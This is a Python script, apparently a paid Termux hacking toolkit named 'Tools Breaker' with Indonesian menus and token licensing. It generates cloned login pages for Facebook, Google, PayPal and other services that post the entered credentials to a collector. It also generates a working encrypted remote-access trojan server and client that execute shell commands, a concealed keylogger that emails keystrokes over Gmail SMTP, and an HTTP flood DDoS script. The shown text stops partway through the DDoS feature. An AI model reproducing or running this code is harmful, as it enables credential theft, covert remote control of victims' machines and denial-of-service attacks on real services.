#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

# Try to import optional dependencies with fallbacks
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image, ImageFilter, ImageDraw, ImageFont
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

init(autoreset=True)

# ================== CONFIG LOCAL ONLY ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
GITHUB_REPO = "MrFoock12/tools-breaker"
SCRIPT_NAME = "tools_breaker.py"
BACKUP_NAME = "tools_breaker_backup.py"
UA_FILE = "ua.txt"
os.makedirs(RESULTS_DIR, exist_ok=True)

# TANPA VPS - semua data local
LOCAL_MODE = True

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except Exception as e:
            print(f"Error extract music: {e}")

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try:
        with open(LICENSE_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error load tokens: {e}")
        return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== CHECK DEPENDENCIES ==================
def check_dependencies():
    print(colored("\n[CHECKING DEPENDENCIES]", 'cyan'))
    missing = []
    
    if not SELENIUM_AVAILABLE:
        missing.append("selenium")
    if not CRYPTO_AVAILABLE:
        missing.append("cryptography")
    if not PILLOW_AVAILABLE:
        missing.append("pillow")
    
    if missing:
        print(colored(f"   • Missing: {', '.join(missing)}", 'yellow'))
        print(colored("   • Install: pip install " + " ".join(missing), 'white'))
    else:
        print(colored("   • All dependencies OK!", 'green'))
    time.sleep(1)

# ================== AUTO UPDATE ==================
def check_for_updates():
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            remote_content = response.text
            with open(SCRIPT_NAME, 'r', encoding='utf-8') as f:
                local_content = f.read()
            
            if remote_content != local_content:
                print(colored("[UPDATE AVAILABLE]", 'yellow'))
                backup = f"{BACKUP_NAME}.{int(time.time())}"
                with open(backup, 'w', encoding='utf-8') as f:
                    f.write(local_content)
                print(colored(f"   • Backup saved: {backup}", 'white'))
                
                choice = input(colored("   Update now? (y/n): ", 'yellow')).lower()
                if choice == 'y':
                    with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                        f.write(remote_content)
                    print(colored("   • Update successful! Restart script.", 'green'))
                    sys.exit(0)
    except Exception as e:
        pass

# ================== MANUAL UPDATE ==================
def manual_update():
    print(colored("\n[MANUAL UPDATE]", 'cyan'))
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(colored("   • Update successful! Restart script.", 'green'))
        else:
            print(colored("   • Failed to fetch update", 'red'))
    except Exception as e:
        print(colored(f"   • Error: {e}", 'red'))

# ================== DEVELOPER TOKEN CREATION ==================
def create_token():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa buat token!", 'red'))
        return
    
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║         DEVELOPER TOKEN CREATOR         ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    username = input(colored("Username buyer: ", 'yellow')).strip()
    whoami_buyer = input(colored("whoami buyer: ", 'yellow')).strip()
    
    print(colored("Pilih plan:", 'cyan'))
    plans = [
        "pemula 1hari",
        "pemula 1minggu", 
        "pemula 1bulan",
        "pro 1hari",
        "pro 1minggu",
        "pro 1bulan"
    ]
    
    for i, plan in enumerate(plans, 1):
        print(colored(f"    {i}. {plan}", 'white'))
    
    try:
        plan_choice = int(input(colored("Pilih [1-6]: ", 'yellow')).strip())
        selected_plan = plans[plan_choice-1]
    except:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        return
    
    # Calculate expiration
    if "1hari" in selected_plan:
        expires = datetime.now() + timedelta(days=1)
    elif "1minggu" in selected_plan:
        expires = datetime.now() + timedelta(weeks=1)
    elif "1bulan" in selected_plan:
        expires = datetime.now() + timedelta(days=30)
    else:
        expires = datetime.now() + timedelta(days=1)
    
    # Generate token
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    # Save to tokens.json
    tokens = load_tokens()
    tokens[username] = {
        'username': username,
        'token': token,
        'whoami': whoami_buyer,
        'plan': selected_plan,
        'active': True,
        'created': datetime.now().isoformat(),
        'expires': expires.isoformat()
    }
    
    save_tokens(tokens)
    
    print(colored(f"\n[SUCCESS] Token berhasil dibuat!", 'green', attrs=['bold']))
    print(colored(f"   • Username: {username}", 'cyan'))
    print(colored(f"   • Token: {token}", 'cyan'))
    print(colored(f"   • whoami: {whoami_buyer}", 'cyan'))
    print(colored(f"   • Plan: {selected_plan}", 'cyan'))
    print(colored(f"   • Expires: {expires.strftime('%d %b %Y')}", 'cyan'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

def view_tokens():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa lihat tokens!", 'red'))
        return
    
    tokens = load_tokens()
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║           TOKENS.JSON VIEWER            ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    if not tokens:
        print(colored("   Tidak ada token tersimpan!", 'yellow'))
    else:
        for username, data in tokens.items():
            status = "AKTIF" if data.get('active', False) else "NONAKTIF"
            expires = datetime.fromisoformat(data['expires']).strftime('%d %b %Y')
            print(colored(f"   • {username}: {data['plan']} | {status} | Exp: {expires}", 'white'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

# ================== VALIDASI TOKEN (ANTI SHARE!) ==================
def validate_token(username, token):
    t = load_tokens()
    if username not in t:
        return None
    user = t[username]
    if not user['active'] or user['token'] != token:
        return None
    if datetime.now() > datetime.fromisoformat(user['expires']):
        user['active'] = False
        save_tokens(t)
        return None
    current_whoami = subprocess.getoutput("whoami")
    if user['whoami'] != current_whoami:
        return None
    return user

# ================== LOGIN SYSTEM ==================
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            TOOLS BREAKER v1.0           ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))

    # Check dependencies first
    check_dependencies()

    # DEVELOPER MODE - Skip login if developer
    if IS_DEVELOPER:
        print(colored("   [DEVELOPER MODE DETECTED!]", 'green', attrs=['bold']))
        print(colored("   • Logged in as: u0_a197", 'cyan'))
        print(colored("   • Access: FULL DEVELOPER PRIVILEGES", 'cyan'))
        print()
        
        print(colored("   [DEVELOPER] Login @uo_a197", 'yellow'))
        print(colored("   Enter...", 'yellow'))
        print()
        
        print(colored("   [1] Masuk Tools", 'white'))
        print(colored("   [2] Buat Token", 'white')) 
        print(colored("   [3] Lihat tokens.json", 'white'))
        
        choice = input(colored("   Pilih: ", 'yellow')).strip()
        
        if choice == "2":
            create_token()
            return login()
        elif choice == "3":
            view_tokens()
            return login()
        elif choice == "1" or choice == "":
            # Continue as developer with dummy credentials
            return "developer_u0_a197", "DEVELOPER LIFETIME"
        else:
            return login()

    # NORMAL USER LOGIN
    print(colored("   • Gunakan token dari @MrFoock12", 'yellow'))
    print(colored("   • Plan: PEMULA / PRO ", 'cyan'))
    print(colored("   • Support: t.me/MrFoock12", 'white'))
    print()

    username = input(colored("   [USERNAME]: ", 'yellow')).strip()
    token = input(colored("   [TOKEN]: ", 'yellow')).strip()

    if not username or not token:
        print(colored("\n[ERROR] Username & Token wajib diisi!", 'red', attrs=['bold']))
        input("\nEnter untuk coba lagi...")
        return login()

    user_data = validate_token(username, token)
    if not user_data:
        print(colored("\n[ERROR] Token Lu Salah Goblok / kadaluarsa / whoami tidak cocok!", 'red', attrs=['bold']))
        print(colored("   • Beli token: @MrFoock12/+62895622994489", 'yellow'))
        input("\nEnter untuk coba lagi...")
        return login()

    # SUCCESS LOGIN
    plan = user_data['plan']
    expires = user_data['expires'][:10]
    print(colored(f"\n[SUCCESS] Login berhasil!", 'green', attrs=['bold']))
    print(colored(f"   • ID: {username.upper()}", 'cyan'))
    print(colored(f"   • Plan: {plan}", 'cyan'))
    print(colored(f"   • Expired: {expires}", 'cyan'))
    print(colored(f"   • whoami: {user_data['whoami']}", 'cyan'))
    input("\nTekan Enter untuk masuk menu...")
    return username, plan

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
       ╔════════════════════════════════════╗
       ║         TOOLS BREAKER v1.0         ║
       ╚════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
Mode: LOCAL (TANPA VPS) | Semua data disimpan lokal
""", None))

# ================== SAVE LOCAL ONLY ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED LOCAL] {filename}", 'green'))
    print(colored(f"   Path: {filepath}", 'cyan'))

# ================== LOAD USER-AGENTS ==================
def load_user_agents():
    if not os.path.exists(UA_FILE):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
    with open(UA_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# ================== FITUR 1: PHISING LOCAL ==================
def fitur_1():  
    os.system('clear'); print(colored("\n[1] PHISING & SOCIAL ENGINEERING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generator Link Phishing]", 'yellow'))
    
    target = input(colored("Target (email/username): ", 'yellow')).strip()
    
    print(colored("\nPilih template phishing:", 'cyan'))
    templates = {
        "1": ("Facebook Login", "facebook", "https://facebook.com/login?user={}"),
        "2": ("Instagram Verify", "instagram", "https://instagram.com/accounts/login/?user={}"),
        "3": ("Google Security", "google", "https://accounts.google.com/signin/v2?email={}"),
        "4": ("WhatsApp Web", "whatsapp", "https://web.whatsapp.com/verify?number={}"),
        "5": ("Twitter Auth", "twitter", "https://twitter.com/i/flow/login?username={}"),
        "6": ("Netflix", "netflix", "https://netflix.com/login?email={}"),
        "7": ("Steam Login", "steam", "https://steamcommunity.com/login/home/?goto={}"),
        "8": ("Discord Auth", "discord", "https://discord.com/login?email={}"),
        "9": ("PayPal", "paypal", "https://paypal.com/signin?email={}"),
        "10": ("Custom URL", "custom", "")
    }
    
    for key, (name, code, url) in templates.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih template [1-10]: ", 'yellow')).strip()
    
    if choice not in templates:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    name, code, url_template = templates[choice]
    
    if choice == "10":  # Custom URL
        custom_url = input(colored("Masukkan URL phishing custom: ", 'yellow')).strip()
        url = custom_url
    else:
        url = url_template.format(target)
    
    print(colored(f"\n[LINK PHISHING GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   URL: {url}", 'cyan'))
    print(colored(f"   Target: {target}", 'cyan'))
    print(colored(f"   Template: {name}", 'cyan'))
    
    # Generate HTML phishing page
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{name} - Please Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ text-align: center; margin-top: 20px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{name}</h2>
            <p>Please login to continue</p>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            <p>© 2024 {name}. All rights reserved.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to server (simulated)
            fetch('https://localhost:8080/log', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{username: username, password: password, time: new Date().toISOString()}})
            }});
            
            alert('Login successful! Redirecting...');
            window.location.href = 'https://{name.lower()}.com';
        }});
    </script>
</body>
</html>'''
    
    # Save HTML file
    html_file = f"phishing_{code}_{int(time.time())}.html"
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    print(colored(f"\n[HTML FILE] Saved: {html_file}", 'green'))
    print(colored("   Buka di browser: ", 'cyan') + colored(f"file://{os.path.abspath(html_file)}", 'white'))
    
    # QR Code option
    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
    if qr_choice == 'y':
        try:
            import qrcode
            qr = qrcode.make(url)
            qr_file = f"phishing_qr_{int(time.time())}.png"
            qr.save(qr_file)
            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
        except ImportError:
            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
    
    save_result("phising.log", f"Target: {target} | Template: {name} | URL: {url}")
    input("\nPress Enter to continue...")

# ================== FITUR 2: RAT LOCAL ==================
def fitur_2():  
    os.system('clear'); print(colored("\n[2] RAT & REMOTE ACCESS TOOL", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: cryptography", 'yellow'))
        print(colored("   Install: pip install cryptography", 'white'))
        input("\nEnter...")
        return
    
    print(colored("   [LOCAL MODE - Generate RAT Tools]", 'yellow'))
    print(colored("\nPilih opsi:", 'cyan'))
    print(colored("   1. Generate RAT Server (Listener)", 'white'))
    print(colored("   2. Generate RAT Client (Payload)", 'white'))
    print(colored("   3. Simple Keylogger", 'white'))
    
    choice = input(colored("\nPilih [1-3]: ", 'yellow')).strip()
    
    if choice == "1":
        # Generate RAT Server
        port = input(colored("Port (default: 4444): ", 'yellow')).strip() or "4444"
        
        rat_server = f'''#!/usr/bin/env python3
import socket, subprocess, threading, os, json, time, sys, platform, shutil
from datetime import datetime
from cryptography.fernet import Fernet

# Generate encryption key
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

print(f"[+] RAT Server Started")
print(f"[+] Encryption Key: {{KEY.decode()}}")
print(f"[+] Listening on 0.0.0.0:{port}")

class RATServer:
    def __init__(self, host='0.0.0.0', port={port}):
        self.host = host
        self.port = port
        self.clients = {{}}
        
    def handle_client(self, client_socket, addr):
        print(f"[+] Connection from {{addr}}")
        client_socket.send(KEY)
        
        try:
            while True:
                # Receive command
                cmd_enc = client_socket.recv(4096)
                if not cmd_enc:
                    break
                
                try:
                    cmd = cipher.decrypt(cmd_enc).decode('utf-8', errors='ignore')
                except:
                    cmd = cipher.decrypt(cmd_enc).decode('latin-1')
                
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'sysinfo':
                    info = f"""
System Information:
OS: {{platform.system()}} {{platform.release()}}
Architecture: {{platform.architecture()[0]}}
Processor: {{platform.processor()}}
Python: {{platform.python_version()}}
Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
"""
                    client_socket.send(cipher.encrypt(info.encode()))
                elif cmd.lower() == 'screenshot':
                    try:
                        from PIL import ImageGrab
                        screenshot = ImageGrab.grab()
                        screenshot.save('screenshot.png')
                        with open('screenshot.png', 'rb') as f:
                            data = f.read()
                        client_socket.send(cipher.encrypt(b'SCREENSHOT:' + data))
                        os.remove('screenshot.png')
                    except Exception as e:
                        client_socket.send(cipher.encrypt(f"Error: {{e}}".encode()))
                elif cmd.startswith('download '):
                    _, filepath = cmd.split(' ', 1)
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        client_socket.send(cipher.encrypt(b'FILE:' + data))
                    else:
                        client_socket.send(cipher.encrypt(f"File not found: {{filepath}}".encode()))
                elif cmd.startswith('upload '):
                    parts = cmd.split(' ', 2)
                    if len(parts) == 3:
                        _, filename, filedata = parts
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(filedata))
                        client_socket.send(cipher.encrypt(f"Uploaded: {{filename}}".encode()))
                else:
                    # Execute command
                    try:
                        result = subprocess.getoutput(cmd)
                        client_socket.send(cipher.encrypt(result.encode()))
                    except Exception as e:
                        client_socket.send(cipher.encrypt(f"Error: {{e}}".encode()))
        except Exception as e:
            print(f"[-] Error with {{addr}}: {{e}}")
        finally:
            client_socket.close()
            print(f"[-] Connection closed: {{addr}}")
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[*] Waiting for connections...")
        
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=self.handle_client, args=(client, addr))
            thread.daemon = True
            thread.start()

if __name__ == '__main__':
    import base64
    server = RATServer()
    server.start()
'''
        
        filename = f"rat_server_{port}.py"
        with open(filename, "w") as f:
            f.write(rat_server)
        
        print(colored(f"\n[SUCCESS] RAT Server saved: {filename}", 'green'))
        print(colored(f"   Run: python3 {filename}", 'cyan'))
        print(colored(f"   Encryption Key will be displayed when server starts", 'yellow'))
        save_result("rat.log", f"Server generated | Port: {port}")
    
    elif choice == "2":
        # Generate RAT Client
        server_ip = input(colored("Server IP: ", 'yellow')).strip()
        server_port = input(colored("Server Port: ", 'yellow')).strip() or "4444"
        key = input(colored("Encryption Key: ", 'yellow')).strip()
        
        rat_client = f'''#!/usr/bin/env python3
import socket, subprocess, os, sys, time, platform, json, base64, threading
from cryptography.fernet import Fernet

# Configuration
SERVER_HOST = '{server_ip}'
SERVER_PORT = {server_port}
KEY = b'{key}'
cipher = Fernet(KEY)

print(f"[+] RAT Client Starting...")
print(f"[+] Connecting to {{SERVER_HOST}}:{{SERVER_PORT}}")

class RATClient:
    def __init__(self):
        self.running = True
        
    def connect(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((SERVER_HOST, SERVER_PORT))
                print(f"[+] Connected to server")
                
                # Receive server key
                server_key = sock.recv(44)
                
                # Main loop
                while self.running:
                    try:
                        # Wait for command from server
                        cmd_enc = sock.recv(4096)
                        if not cmd_enc:
                            break
                        
                        cmd = cipher.decrypt(cmd_enc).decode()
                        
                        if cmd.lower() == 'exit':
                            self.running = False
                            sock.send(cipher.encrypt(b"Client shutting down"))
                            break
                        
                        # Process command
                        response = self.process_command(cmd)
                        sock.send(cipher.encrypt(response.encode()))
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        sock.send(cipher.encrypt(f"Error: {{e}}".encode()))
                
                sock.close()
                
            except Exception as e:
                print(f"[-] Connection error: {{e}}")
                time.sleep(30)  # Wait before reconnecting
    
    def process_command(self, cmd):
        try:
            if cmd.lower() == 'ping':
                return "pong"
            elif cmd.lower() == 'sysinfo':
                info = f"""
Client System Info:
Hostname: {{platform.node()}}
OS: {{platform.system()}} {{platform.release()}}
Arch: {{platform.machine()}}
Python: {{platform.python_version()}}
User: {{os.getlogin()}}
Working Dir: {{os.getcwd()}}
"""
                return info
            elif cmd.lower() == 'ls' or cmd.lower() == 'dir':
                return '\\n'.join(os.listdir('.'))
            elif cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:])
                    return f"Changed to: {{os.getcwd()}}"
                except Exception as e:
                    return f"Error: {{e}}"
            elif cmd.startswith('download '):
                # This is handled by server
                return "Download command received"
            else:
                # Execute shell command
                result = subprocess.getoutput(cmd)
                return result
        except Exception as e:
            return f"Command error: {{e}}"
    
    def start(self):
        # Start connection thread
        conn_thread = threading.Thread(target=self.connect)
        conn_thread.daemon = True
        conn_thread.start()
        
        # Keep main thread alive
        while self.running:
            time.sleep(1)

if __name__ == '__main__':
    client = RATClient()
    client.start()
'''
        
        filename = f"rat_client_{int(time.time())}.py"
        with open(filename, "w") as f:
            f.write(rat_client)
        
        print(colored(f"\n[SUCCESS] RAT Client saved: {filename}", 'green'))
        print(colored(f"   Deploy to target and run: python3 {filename}", 'cyan'))
        save_result("rat.log", f"Client generated | Target: {server_ip}:{server_port}")
    
    elif choice == "3":
        # Simple Keylogger
        print(colored("\n[KEYLOGGER GENERATOR]", 'yellow'))
        email = input(colored("Email to send logs (optional): ", 'yellow')).strip()
        interval = input(colored("Log interval (seconds, default 60): ", 'yellow')).strip() or "60"
        
        keylogger = f'''#!/usr/bin/env python3
import keyboard, smtplib, threading, time, os, sys
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
LOG_FILE = "keylog.txt"
SEND_EMAIL = {'True' if email else 'False'}
EMAIL_ADDR = '{email}'
EMAIL_PASS = "your_app_password_here"  # Use app-specific password
INTERVAL = {interval}

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_time = datetime.now()
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{{name.upper()}}]"
        
        self.log += name
        
        # Write to file every 100 chars
        if len(self.log) >= 100:
            self.save_log()
    
    def save_log(self):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{{timestamp}}] {{self.log}}\\n")
        self.log = ""
    
    def send_logs(self):
        if not SEND_EMAIL or not os.path.exists(LOG_FILE):
            return
        
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            
            if not content:
                return
            
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDR
            msg['To'] = EMAIL_ADDR
            msg['Subject'] = f"Keylogger Report {{datetime.now().strftime('%Y-%m-%d %H:%M')}}"
            
            body = f"""
Keylogger Report
Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
Host: {{os.getenv('COMPUTERNAME', 'Unknown')}}
User: {{os.getenv('USERNAME', 'Unknown')}}

Logs:
{{content}}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Gmail SMTP
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ADDR, EMAIL_PASS)
            server.send_message(msg)
            server.quit()
            
            print("[+] Logs sent via email")
            
            # Clear log file after sending
            open(LOG_FILE, 'w').close()
            
        except Exception as e:
            print(f"[-] Email error: {{e}}")
    
    def start(self):
        print(f"[*] Keylogger started at {{self.start_time}}")
        print(f"[*] Log file: {{LOG_FILE}}")
        {'print(f"[*] Email: {EMAIL_ADDR}")' if email else ''}
        
        # Start keyboard listener
        keyboard.on_release(callback=self.callback)
        
        # Timer for email sending
        if SEND_EMAIL:
            def email_timer():
                while True:
                    time.sleep(INTERVAL)
                    self.send_logs()
            
            email_thread = threading.Thread(target=email_timer)
            email_thread.daemon = True
            email_thread.start()
        
        # Keep running
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.save_log()
            if SEND_EMAIL:
                self.send_logs()
            print("\\n[*] Keylogger stopped")

if __name__ == '__main__':
    logger = KeyLogger()
    
    # Hide console on Windows
    if sys.platform == "win32":
        import win32gui, win32con
        win = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(win, win32con.SW_HIDE)
    
    logger.start()
'''
        
        filename = "keylogger.py"
        with open(filename, "w") as f:
            f.write(keylogger)
        
        print(colored(f"\n[SUCCESS] Keylogger saved: {filename}", 'green'))
        if email:
            print(colored(f"   Configure EMAIL_PASS with app-specific password", 'yellow'))
        print(colored(f"   Run: python3 {filename}", 'cyan'))
        save_result("keylogger.log", f"Generated keylogger | Email: {email}")
    
    input("\nPress Enter to continue...")

# ================== FITUR 3: DDOS LOCAL ==================
def fitur_3():  
    os.system('clear'); print(colored("\n[3] DDOS & STRESSER TOOL", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - DDoS Script Generator]", 'yellow'))
    
    target = input(colored("Target URL/IP: ", 'yellow')).strip()
    port = input(colored("Port (default 80): ", 'yellow')).strip() or "80"
    duration = input(colored("Duration (seconds): ", 'yellow')).strip() or "60"
    threads = input(colored("Threads (default 500): ", 'yellow')).strip() or "500"
    
    ddos_script = f'''#!/usr/bin/env python3
import socket, threading, time, random, sys, ssl, os

target = '{target}'
port = {port}
duration = {duration}
threads = {threads}
timeout_time = time.time() + duration

attack_num = 0
success_count = 0

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0'
]

def attack():
    global attack_num, success_count
    
    while time.time() < timeout_time:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Connect
            s.connect((target, port))
            
            # Generate random IP
            fake_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))
            
            # HTTP flood
            headers = f"""GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\nUser-Agent: {{random.choice(user_agents)}}\\r\\nX-Forwarded-For: {{fake_ip}}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"""
            
            s.send(headers.encode())
            
            # Send more data
            for _ in range(random.randint(10, 50)):
                try:
                    s.send(b"X-Data: " + os.urandom(1024))
                except:
                    break
            
            attack_num += 1
            success_count += 1
            
            if attack_num % 100 == 0:
                print(f"[+] Attacks sent: {{attack_num}} | Successful: {{success_count}}")
            
            s.close()
            
        except Exception as e:
            # Connection failed, continue
            pass
        
        # Small delay to avoid overwhelming local system
        time.sleep(0.001)

print(f"[*] Starting DDoS attack on {{target}}:{{port}}")
print(f"[*] Duration: {{duration}} seconds")
print(f"[*] Threads: {{threads}}")
print(f"[*] Starting at {{time.strftime('%H:%M:%S')}}")

# Create and start threads
thread_list = []
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()
    thread_list.append(thread)

# Wait for duration
time.sleep(duration)

print(f"\\n[+] Attack completed!")
print(f"[+] Total attacks attempted: {{attack_num}}")
print(f"[+] Successful connections: {{success_count}}")
print(f"[+] Finished at {{time.strftime('%H:%M:%S')}}")
'''

    filename = f"ddos_attack_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(ddos_script)
    
